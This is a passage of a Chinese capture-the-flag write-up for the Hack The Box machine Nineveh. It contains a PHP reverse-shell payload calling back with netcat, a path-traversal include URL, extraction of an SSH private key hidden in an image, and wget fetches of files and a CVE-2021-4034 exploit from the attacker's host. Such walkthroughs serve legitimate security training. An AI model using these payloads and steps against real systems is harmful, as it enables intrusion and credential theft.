+<p><code>&lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.45 443 &gt;/tmp/f&quot;);?&gt;</code></p>
+<p><img src="http://sh1yan.top/photo/Nineveh-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Nineveh-htb-writeup/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>9、这里结合上一个网站的任意文件读取包含，可以获取到一个初始的shell环境</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../var/tmp/rce.php</span><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp <span class="hljs-number">443</span><br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.43</span>] <span class="hljs-number">53294</span><br>/bin/sh: <span class="hljs-number">0</span>: can<span class="hljs-number">&#x27;</span>t access tty; job control turned off<br>$ id<br>uid=<span class="hljs-number">33</span>(www-data) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data)<br>$ python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>/bin/sh: <span class="hljs-number">2</span>: python: not found<br>$ python3 -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>www-data@nineveh:/var/www/html/department$ <br><br>www-data@nineveh:/var/www/html/department$ <br></code></pre></td></tr></table></figure>
+
+<p>10、成功获取到反弹shell，升级一下完整的交互shell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">www-data@nineveh:/var/www/html/department$ script /dev/null -c bash<br>script /dev/null -c bash<br>Script started, file is /dev/null<br>www-data@nineveh:/var/www/html/department$ ^Z<br>zsh: suspended  nc -lvnp <span class="hljs-number">443</span><br>                                                              <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ stty raw -echo; fg<br>[<span class="hljs-number">1</span>]  + continued  nc -lvnp <span class="hljs-number">443</span><br>                              reset<br>reset: unknown terminal type unknown<br>Terminal type? screen<br><br><br>www-data@nineveh:/var/www/html/department$<br><br><br>www-data@nineveh:/var/www/html/department$ ls -la /home<br>total <span class="hljs-number">12</span><br>drwxr-xr-x  <span class="hljs-number">3</span> root   root   <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> .<br>drwxr-xr-x <span class="hljs-number">24</span> root   root   <span class="hljs-number">4096</span> Jan <span class="hljs-number">29</span>  <span class="hljs-number">2021</span> ..<br>drwxr-xr-x  <span class="hljs-number">4</span> amrois amrois <span class="hljs-number">4096</span> Dec <span class="hljs-number">17</span>  <span class="hljs-number">2020</span> amrois<br>www-data@nineveh:/var/www/html/department$<br></code></pre></td></tr></table></figure>
+
+<p>11、经过各种枚举，发现 nineveh.png 图片中包含ssh的秘钥</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c">www-data@nineveh:/var/www/html/department$ cd /home/amrois<br>www-data@nineveh:/home/amrois$ ls -la<br>total <span class="hljs-number">32</span><br>drwxr-xr-x <span class="hljs-number">4</span> amrois amrois <span class="hljs-number">4096</span> Dec <span class="hljs-number">17</span>  <span class="hljs-number">2020</span> .<br>drwxr-xr-x <span class="hljs-number">3</span> root   root   <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> ..<br>lrwxrwxrwx <span class="hljs-number">1</span> root   root      <span class="hljs-number">9</span> Dec <span class="hljs-number">17</span>  <span class="hljs-number">2020</span> .bash_history -&gt; /dev/null<br>-rw-r--r-- <span class="hljs-number">1</span> amrois amrois  <span class="hljs-number">220</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> .bash_logout<br>-rw-r--r-- <span class="hljs-number">1</span> amrois amrois <span class="hljs-number">3765</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> .bashrc<br>drwx------ <span class="hljs-number">2</span> amrois amrois <span class="hljs-number">4096</span> Jul  <span class="hljs-number">3</span>  <span class="hljs-number">2017</span> .cache<br>-rw-r--r-- <span class="hljs-number">1</span> amrois amrois  <span class="hljs-number">655</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> .profile<br>drwxr-xr-x <span class="hljs-number">2</span> amrois amrois <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> .ssh<br>-rw------- <span class="hljs-number">1</span> amrois amrois   <span class="hljs-number">33</span> May <span class="hljs-number">26</span> <span class="hljs-number">10</span>:<span class="hljs-number">48</span> user.txt<br>www-data@nineveh:/home/amrois$<br><br><br><br>www-data@nineveh:/home/amrois$ cd /var/www/                <br>www-data@nineveh:/var/www$ ls -la<br>total <span class="hljs-number">20</span><br>drwxr-xr-x  <span class="hljs-number">5</span> root root <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> .<br>drwxr-xr-x <span class="hljs-number">14</span> root root <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> ..<br>drwxr-xr-x  <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> cd<br>drwxr-xr-x  <span class="hljs-number">3</span> root root <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> html<br>drwxr-xr-x  <span class="hljs-number">4</span> root root <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> ssl<br>www-data@nineveh:/var/www$ cd ssl<br>www-data@nineveh:/var/www/ssl$ ls -la<br>total <span class="hljs-number">568</span><br>drwxr-xr-x <span class="hljs-number">4</span> root root   <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> .<br>drwxr-xr-x <span class="hljs-number">5</span> root root   <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> ..<br>drwxr-xr-x <span class="hljs-number">2</span> root root   <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> db<br>-rw-r--r-- <span class="hljs-number">1</span> root root     <span class="hljs-number">49</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> index.html<br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">560852</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> ninevehForAll.png<br>drwxr-xr-x <span class="hljs-number">2</span> root root   <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> secure_notes<br>www-data@nineveh:/var/www/ssl$ cd secure_notes/<br>www-data@nineveh:/var/www/ssl/secure_notes$ ls -la<br>total <span class="hljs-number">2840</span><br>drwxr-xr-x <span class="hljs-number">2</span> root root    <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> .<br>drwxr-xr-x <span class="hljs-number">4</span> root root    <span class="hljs-number">4096</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> ..<br>-rw-r--r-- <span class="hljs-number">1</span> root root      <span class="hljs-number">71</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> index.html<br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">2891984</span> Jul  <span class="hljs-number">2</span>  <span class="hljs-number">2017</span> nineveh.png<br>www-data@nineveh:/var/www/ssl/secure_notes$<br><br><br>www-data@nineveh:/var/www/ssl/secure_notes$ strings -n <span class="hljs-number">20</span> nineveh.png<br>-----BEGIN RSA PRIVATE KEY-----<br>MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI<br>H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU<br>PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5<br>FQq1/wmB65c8bds5tETlacr/<span class="hljs-number">15</span>Ofv1A2j+vIdggxNgm8A34xZiP/WV7+<span class="hljs-number">7</span>mhgvcnI<br><span class="hljs-number">3</span>oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT<br>X+/<span class="hljs-number">1</span>/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn<br>KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk<br>FYDm5gTLIfuPDOV5jq/<span class="hljs-number">9</span>Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z<br>GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR<br>JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo<br><span class="hljs-number">9</span>odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu<br>Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb<br>ujOUscFgZf2P+<span class="hljs-number">70U</span>naceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl<br><span class="hljs-number">1</span>tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b<br>vCMuW7qAc9K1Amz3+<span class="hljs-number">6</span>dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx<br>DdhOa4x+<span class="hljs-number">0</span>MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89<br>P+<span class="hljs-number">6</span>+<span class="hljs-number">1F</span>XXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC<br>fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i<br>tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC<br>iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+<span class="hljs-number">7</span>pMHjmRaKLj+lehLbTMFlB1<br>MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh<br>PNilsNNjfnt/G3RZiq1/Uc+<span class="hljs-number">6</span>dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse<br>i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc<br>il6RYzQV/<span class="hljs-number">2UL</span>gUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7<br>fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG<br>-----END RSA PRIVATE KEY-----<br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY<span class="hljs-comment">//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb</span><br>www-data@nineveh:/var/www/ssl/secure_notes$<br></code></pre></td></tr></table></figure>
+
+<p>12、这里就发现了另一个用户的ssh key了，这里补充下上面发现的步骤，先把文件传输到本地地址上</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c">──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lnp <span class="hljs-number">6666</span> &gt; nineveh.png<br><br><br>www-data@nineveh:/var/www/ssl/secure_notes$ <br>&lt;sl/secure_notes$ nc -v <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span> <span class="hljs-number">6666</span> &lt; nineveh.png                       <br>Connection to <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span> <span class="hljs-number">6666</span> port [tcp<span class="hljs-comment">/*] succeeded!</span><br><span class="hljs-comment">www-data@nineveh:/var/www/ssl/secure_notes$ </span><br><span class="hljs-comment">www-data@nineveh:/var/www/ssl/secure_notes$ </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-comment">└─$ binwalk nineveh.png                                                                                                          </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="hljs-comment">--------------------------------------------------------------------------------</span><br><span class="hljs-comment">0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced</span><br><span class="hljs-comment">84            0x54            Zlib compressed data, best compression</span><br><span class="hljs-comment">2881744       0x2BF8D0        POSIX tar archive (GNU)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-comment">└─$ sudo binwalk -eM --run-as=root nineveh.png </span><br><span class="hljs-comment">[sudo] kali 的密码：</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Scan Time:     2024-05-27 23:32:43</span><br><span class="hljs-comment">Target File:   /home/kali/Desktop/nineveh.png</span><br><span class="hljs-comment">MD5 Checksum:  353b8f5a4578e4472c686b6e1f15c808</span><br><span class="hljs-comment">Signatures:    411</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="hljs-comment">--------------------------------------------------------------------------------</span><br><span class="hljs-comment">0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced</span><br><span class="hljs-comment">84            0x54            Zlib compressed data, best compression</span><br><span class="hljs-comment">2881744       0x2BF8D0        POSIX tar archive (GNU)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Scan Time:     2024-05-27 23:32:43</span><br><span class="hljs-comment">Target File:   /home/kali/Desktop/_nineveh.png.extracted/54</span><br><span class="hljs-comment">MD5 Checksum:  d41d8cd98f00b204e9800998ecf8427e</span><br><span class="hljs-comment">Signatures:    411</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="hljs-comment">--------------------------------------------------------------------------------</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Scan Time:     2024-05-27 23:32:43</span><br><span class="hljs-comment">Target File:   /home/kali/Desktop/_nineveh.png.extracted/secret/nineveh.priv</span><br><span class="hljs-comment">MD5 Checksum:  f426d661f94b16292efc810ebb7ea305</span><br><span class="hljs-comment">Signatures:    411</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="hljs-comment">--------------------------------------------------------------------------------</span><br><span class="hljs-comment">0             0x0             PEM RSA private key</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Scan Time:     2024-05-27 23:32:43</span><br><span class="hljs-comment">Target File:   /home/kali/Desktop/_nineveh.png.extracted/secret/nineveh.pub</span><br><span class="hljs-comment">MD5 Checksum:  6b60618d207ad97e76664174e805cfda</span><br><span class="hljs-comment">Signatures:    411</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="hljs-comment">--------------------------------------------------------------------------------</span><br><span class="hljs-comment">0             0x0             OpenSSH RSA public key</span><br></code></pre></td></tr></table></figure>
+
+<p>13、由于靶机没有SSH端口，所以只能在获取的初始shell中进行用户切换了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c">www-data@nineveh:/var/www/ssl/secure_notes$ cd /tmp<br>www-data@nineveh:/tmp$ wget <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>/nineveh.priv<br>-<span class="hljs-number">-2024</span><span class="hljs-number">-05</span><span class="hljs-number">-27</span> <span class="hljs-number">02</span>:<span class="hljs-number">43</span>:<span class="hljs-number">46</span>--  http:<span class="hljs-comment">//10.10.14.45/nineveh.priv</span><br>Connecting to <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>:<span class="hljs-number">80.</span>.. connected.<br>HTTP request sent, awaiting response... <span class="hljs-number">200</span> OK<br>Length: <span class="hljs-number">1675</span> (<span class="hljs-number">1.6</span>K) [application/octet-stream]<br>Saving to: <span class="hljs-string">&#x27;nineveh.priv&#x27;</span><br><br>nineveh.priv        <span class="hljs-number">100</span>%[===================&gt;]   <span class="hljs-number">1.64</span>K  --.-KB/s    in <span class="hljs-number">0.03</span>s   <br><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-27</span> <span class="hljs-number">02</span>:<span class="hljs-number">43</span>:<span class="hljs-number">47</span> (<span class="hljs-number">64.3</span> KB/s) - <span class="hljs-string">&#x27;nineveh.priv&#x27;</span> saved [<span class="hljs-number">1675</span>/<span class="hljs-number">1675</span>]<br><br>www-data@nineveh:/tmp$ ls -la<br>total <span class="hljs-number">40</span><br>drwxrwxrwt  <span class="hljs-number">9</span> root     root     <span class="hljs-number">4096</span> May <span class="hljs-number">27</span> <span class="hljs-number">02</span>:<span class="hljs-number">43</span> .<br>drwxr-xr-x <span class="hljs-number">24</span> root     root     <span class="hljs-number">4096</span> Jan <span class="hljs-number">29</span>  <span class="hljs-number">2021</span> ..<br>drwxrwxrwt  <span class="hljs-number">2</span> root     root     <span class="hljs-number">4096</span> May <span class="hljs-number">26</span> <span class="hljs-number">10</span>:<span class="hljs-number">48</span> .ICE-unix<br>drwxrwxrwt  <span class="hljs-number">2</span> root     root     <span class="hljs-number">4096</span> May <span class="hljs-number">26</span> <span class="hljs-number">10</span>:<span class="hljs-number">48</span> .Test-unix<br>drwxrwxrwt  <span class="hljs-number">2</span> root     root     <span class="hljs-number">4096</span> May <span class="hljs-number">26</span> <span class="hljs-number">10</span>:<span class="hljs-number">48</span> .X11-unix<br>drwxrwxrwt  <span class="hljs-number">2</span> root     root     <span class="hljs-number">4096</span> May <span class="hljs-number">26</span> <span class="hljs-number">10</span>:<span class="hljs-number">48</span> .XIM-unix<br>drwxrwxrwt  <span class="hljs-number">2</span> root     root     <span class="hljs-number">4096</span> May <span class="hljs-number">26</span> <span class="hljs-number">10</span>:<span class="hljs-number">48</span> .font-unix<br>prw-r--r--  <span class="hljs-number">1</span> www-data www-data    <span class="hljs-number">0</span> May <span class="hljs-number">27</span> <span class="hljs-number">02</span>:<span class="hljs-number">43</span> f<br>-rw-r--r--  <span class="hljs-number">1</span> www-data www-data <span class="hljs-number">1675</span> May <span class="hljs-number">27</span>  <span class="hljs-number">2024</span> nineveh.priv<br>drwx------  <span class="hljs-number">3</span> root     root     <span class="hljs-number">4096</span> May <span class="hljs-number">26</span> <span class="hljs-number">10</span>:<span class="hljs-number">48</span> systemd-private-ad3cdfb60db0415996f4eb34b1ec1207-systemd-timesyncd.service-RpSvjR<br>drwx------  <span class="hljs-number">2</span> root     root     <span class="hljs-number">4096</span> May <span class="hljs-number">26</span> <span class="hljs-number">10</span>:<span class="hljs-number">48</span> vmware-root<br>www-data@nineveh:/tmp$ chmod <span class="hljs-number">600</span> ./nineveh.priv<br>www-data@nineveh:/tmp$ ssh amrois@localhost -i nineveh.priv<br>Could not create directory <span class="hljs-string">&#x27;/var/www/.ssh&#x27;</span>.<br>The authenticity of host <span class="hljs-string">&#x27;localhost (127.0.0.1)&#x27;</span> can<span class="hljs-number">&#x27;</span>t be established.<br>ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.<br>Are you sure you want to <span class="hljs-keyword">continue</span> connecting (yes/no)? yes<br>Failed to add the host to the <span class="hljs-built_in">list</span> of known hosts (/var/www/.ssh/known_hosts).<br>Ubuntu <span class="hljs-number">16.04</span><span class="hljs-number">.2</span> LTS<br>Welcome to Ubuntu <span class="hljs-number">16.04</span><span class="hljs-number">.2</span> LTS (GNU/Linux <span class="hljs-number">4.4</span><span class="hljs-number">.0</span><span class="hljs-number">-62</span>-generic x86_64)<br><br> * Documentation:  https:<span class="hljs-comment">//help.ubuntu.com</span><br> * Management:     https:<span class="hljs-comment">//landscape.canonical.com</span><br> * Support:        https:<span class="hljs-comment">//ubuntu.com/advantage</span><br><br><span class="hljs-number">288</span> packages can be updated.<br><span class="hljs-number">207</span> updates are security updates.<br><br><br>You have mail.<br>Last login: Mon Jul  <span class="hljs-number">3</span> <span class="hljs-number">00</span>:<span class="hljs-number">19</span>:<span class="hljs-number">59</span> <span class="hljs-number">2017</span> from <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.14</span><br>amrois@nineveh:~$ id<br>uid=<span class="hljs-number">1000</span>(amrois) gid=<span class="hljs-number">1000</span>(amrois) groups=<span class="hljs-number">1000</span>(amrois)<br>amrois@nineveh:~$ pwd<br>/home/amrois<br>amrois@nineveh:~$ <br></code></pre></td></tr></table></figure>
+
+<p>14、至此获取到第一个flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">amrois@nineveh:~$ cat user.txt <br><span class="hljs-number">721f</span>d8afb8ea1480e4db0fa713754877<br>amrois@nineveh:~$ <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>15、这里使用linpeas工具进行枚举，发现了两个可以提权的漏洞</p>
+<p><img src="http://sh1yan.top/photo/Nineveh-htb-writeup/11.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Nineveh-htb-writeup/12.png" srcset="/img/loading.gif" lazyload></p>
+<p>16、这里先利用第一个漏洞进行提权，并获取最终的flag信息</p>
+<p><code>CVE-2021-4034</code></p>
+<p><code>https://github.com/joeammond/CVE-2021-4034</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">amrois@nineveh:~$ wget <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>/CVE<span class="hljs-number">-2021</span><span class="hljs-number">-4034.</span>py<br>-<span class="hljs-number">-2024</span><span class="hljs-number">-05</span><span class="hljs-number">-27</span> <span class="hljs-number">02</span>:<span class="hljs-number">50</span>:<span class="hljs-number">18</span>--  http:<span class="hljs-comment">//10.10.14.45/CVE-2021-4034.py</span><br>Connecting to <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>:<span class="hljs-number">80.</span>.. connected.<br>HTTP request sent, awaiting response... <span class="hljs-number">200</span> OK<br>Length: 